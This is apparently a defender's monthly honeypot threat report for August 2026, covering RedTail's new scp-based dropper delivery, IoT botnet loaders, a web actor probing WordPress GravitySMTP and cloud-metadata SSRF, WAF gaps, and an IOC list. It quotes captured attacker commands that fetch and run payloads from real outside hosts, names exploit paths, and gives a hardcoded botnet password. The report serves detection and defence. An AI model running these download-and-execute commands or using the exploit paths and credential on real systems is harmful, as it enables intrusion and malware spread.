# WebSpeare + Cowrie — Threat Report, August 2026 (MTD)

**Reporting window:** 2026-08-01 → 2026-08-19
**Sensors:** Cowrie SSH/Telnet (`do-us/new-york`) + 2× WebSpeare web nodes (`192.168.67.2/.3`)
**Volume:** ~885K events · **Maintainer:** Oak Atsume (DC801)
**Source:** Graylog (GELF feed)

---

## Executive summary

- **RedTail changed how it delivers payloads.** It now writes an embedded **OpenSSH private key** to disk and pulls the dropper over **`scp` from `dlr@217.60.195.113`** (HTTPS wget/curl fallback). The private key + operator username are captured in our logs — a strong pivot/IOC.
- **A fresh crop of IoT botnet loaders** rotated in (July's hosts are gone): **"iran"** (`165.22.69.214`), **"Exodus"** (`176.65.139.228:6677`), plus `103.77.246.150` and `83.168.69.141`. Only **RedTail** (`217.60.195.113`) persists across both months.
- **The `185.177.72.0/24` web actor is still here and added new modules** — a **WordPress GravitySMTP** unauth cred-leak and **Cloud-Metadata SSRF (IMDS theft)**, run together as a coordinated **Aug 11–12 cloud-credential push**.
- **Two persistent SSH operations** continue from July: `91.92.40–47.x` (brute + malware host, expanded to three /24s) and `45.153.34.x`. A new single-IP brute — `189.85.145.83` (Brazil, PERSIS INTERNET) — drove the Aug 14 traffic spike.
- **WAF:** the web nodes picked up new signatures and the interactive decoys are firing, but a **phpinfo discovery sweep** and **generic PHP recon scripts** were slipping through, and the July gap-rules still aren't live on the sensors (deploy lag). Addressed below.

---

## 1. Data quality & caveats

- **Aug 1–6 collection outage.** Volume ran ~1.5K/day vs a ~70K/day baseline. **Cause (confirmed by maintainer): the relay tunnel went dark**, and a batch of data for an **Asian ISP was lost**. **No indicators of compromise** — this is a collection gap, not an incident.
- **Consequence for this report:** August's **APAC geography is under-counted** (Vietnam/Singapore/Korea/India/Indonesia are present but low). Treat regional totals as a floor, not a true distribution.
- Service resumed normally on **Aug 7**.

---

## 2. Volume & timeline

```
Aug01 ▌ 1.4   ┐
Aug02 ▌ 1.6   │  relay tunnel dark /
Aug03 ▌ 1.7   │  Asian-ISP data lost
Aug04 ▌ 1.4   │  (collection gap, no compromise)
Aug05 ▌ 1.5   │
Aug06 ██ 7.5  ┘  recovery begins
Aug07 ████████████████ 76.5
Aug08 ████████████████ 72.9
Aug09 ████████████ 55.7
Aug10 ████████████████ 75.7
Aug11 ████████████████ 76.3   ← GravitySMTP + IMDS-SSRF push begins
Aug12 █████████████████ 77.1
Aug13 ████████████ 56.8
Aug14 ████████████████████████████ 127.9   ← spike (see below)
Aug15 ██████████████ 63.9
Aug16 █████████ 44.0
Aug17 ████████████████ 73.3
Aug18 ████████████ 54.3
Aug19 ███ 15.4 (partial)
```

**Aug 14 spike (128K, ~2×) attribution:** a **web surge to ~28K** (≈4× normal — the returning `185.177.72/24` wave) layered on top of a single Brazilian SSH brute-forcer, **`189.85.145.83`** (~46K events this month, concentrated that day).

---

## 3. Geography & infrastructure

**Top origins (August, APAC under-counted):** Netherlands (212K), United States (115K), Bulgaria (59K), Sweden (59K), France (55K), **Brazil (55K ↑)**, United Kingdom (55K), Romania (31K), Vietnam (30K), Germany (30K), **Nigeria (21K ↑ — newly prominent)**, Singapore (20K).

Infrastructure remains overwhelmingly **cheap/bulletproof VPS** (Pfcloud, Bullet Group, Bucklog, DigitalOcean, Alfahost, Cyberzone). Brazil's rise tracks the `189.85.145.83` brute; Nigeria is a new entrant worth watching.

---

## 4. New operations (with timelines)

### 4.1 RedTail — evolved delivery via SSH key + scp  *(highlight)*
RedTail no longer just `wget`/`curl`s its dropper. It now embeds an **OpenSSH ed25519 private key**, writes it to `key.ppk`, and runs:
```
scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh   # HTTPS wget/curl fallback
```
The **full private key and the operator username `dlr@217.60.195.113`** are in `cowrie.command.input`. Same C2 as July, now authenticating to its own dropper host. Also still tagging telnet sessions with `echo TEL_OK` / `redtail_bot_telnet_ok`.

### 4.2 New IoT botnet loaders
| Operation | Host | Payloads |
|---|---|---|
| **"iran"** | `165.22.69.214` (DigitalOcean) | `iran.{x86_64,aarch64,m68k,mips,mipsel}`, `cat.sh` |
| **Exodus** | `176.65.139.228:6677` | `Exodus.sh`, `bins/{mips,mipsel,x32,x86}`; runs `history -c` |
| loader | `103.77.246.150` | `get.sh`, `loader.sh`, `mips.sh` |
| loader | `83.168.69.141` | `armv7l` |

### 4.3 `185.177.72.0/24` — persistent web actor, new modules
Same subnet as July (7+ IPs, ~38K requests in August). Added two exploits, used together in a **coordinated Aug 11–12 cloud-credential push**:
- **WordPress GravitySMTP unauth cred-leak** — `GET /wp-json/gravitysmtp/v1/tests/mock-data` — Aug 11 (134), Aug 12 (68), Aug 17 (142).
- **Cloud-Metadata SSRF / IMDS credential theft** — Aug 11 (128), Aug 12 (64).

---

## 5. Persistent operators (carried from July)

- **`91.92.40–47.x`** — SSH brute-force **and** malware distribution host; expanded across three /24s (~40K events).
- **`45.153.34.x`** — dedicated SSH brute-force /24.
- **`185.177.72.x`** — web recon + exploitation (see 4.3).
- **RedTail** C2 `217.60.195.113`.

New heavy hitters: SSH — `189.85.145.83` (BR), `159.223.97.144`, `165.154.177.119`, `77.239.124.240/.249`; Web — `130.12.180.77` (26K single IP).

---

## 6. SSH honeypot highlights

- **Successful logins** skew to `admin`, `oracle`, `steam`, `trader`, `root`. The hardcoded IoT credential **`3245gs5662d34`** (152 successes) persists — a reliable botnet fingerprint.
- **Post-login TTPs:** IoT recon (`cat /proc/*`, `/bin/busybox TEST`), the RedTail scp/key delivery (4.1), and Exodus (`wget http://176.65.139.228:6677/Exodus.sh; ./Exodus.sh; history -c`).
- **Telnet CVE-2026-24061** (`USER -f root` arg injection) continues at low volume (6 attempts) from rotating hosts.

---

## 7. WAF coverage — gaps found & closed

**Found missed in August (`NOT _exists_:waf`):**
1. **phpinfo discovery sweep** — dozens of prefixed variants (`/cpanel/phpinfo.php`, `/plesk/phpinfo.php`, `/old/phpinfo.php`, `/php_info.php`, `/cgi-bin/phpinfo.cgi`, …). The old decoy only matched three exact paths.
2. **Generic PHP diagnostic/recon scripts** — `/debug.php`, `/server.php`, `/sys.php`, `/env.php`, `/status.php`, `/i.php`, `/db.php`, `/adminer.php`.
3. **Deploy lag** — `/appsettings.json`, `/config/settings.ini`, `rtsp://…` were *still* in the miss bucket even though rules for them exist in the repo (`observed-2026-07-gaps.json`, `observed-2026-h1-gaps.json`). This is a **sensor deployment lag, not a missing signature.**

**Closed this cycle:**
- **Broadened `PHPInfoDecoy`** to match phpinfo-family basenames under *any* path prefix → the whole sweep now lands on the interactive fake-phpinfo decoy instead of slipping past.
- **New rule** `observed-2026-08-gaps.json` → *"PHP Diagnostic / Recon Script Probe"* classifies the generic PHP recon scripts (medium).

> **Action required:** redeploy/restart the live sensors so the repo ruleset (July + August gap files, broadened decoy) actually takes effect, then re-run the `NOT _exists_:waf` query in ~a week to measure lift.

---

## 8. IOC appendix

**C2 / operator**
- `217.60.195.113` — RedTail C2/dropper; scp user `dlr@`; serves `/sh`
- (RedTail SSH private key material present in `cowrie.command.input` — extract for fingerprinting/pivoting)

**Malware distribution hosts**
- `165.22.69.214` (iran) · `176.65.139.228:6677` (Exodus) · `103.77.246.150` · `83.168.69.141`

**High-volume attackers**
- SSH: `189.85.145.83` (BR), `159.223.97.144`, `165.154.177.119`, `91.92.40–47.x`, `45.153.34.x`, `77.239.124.240/.249`
- Web: `130.12.180.77`, `185.177.72.0/24`

**Exploits observed**
- WordPress GravitySMTP (`/wp-json/gravitysmtp/v1/tests/mock-data`) · Cloud-Metadata SSRF (IMDS) · Telnet CVE-2026-24061 · Hikvision CVE-2021-36260

**Credential fingerprint**
- `3245gs5662d34` (hardcoded IoT botnet password)

---

## 9. Recommendations

1. **Redeploy the sensors** — the single highest-leverage action; multiple written rules aren't live.
2. **Extract & fingerprint the RedTail SSH key** — check for reuse across sessions/other C2s; it's a strong pivot.
3. **Notify/monitor** the GravitySMTP + IMDS-SSRF push — consider a decoy that serves canaried SMTP creds to the `185.177.72/24` actor.
4. **Passive OSINT refresh** on the new infra (`165.22.69.214`, `176.65.139.228`, `189.85.145.83`) as done in July.
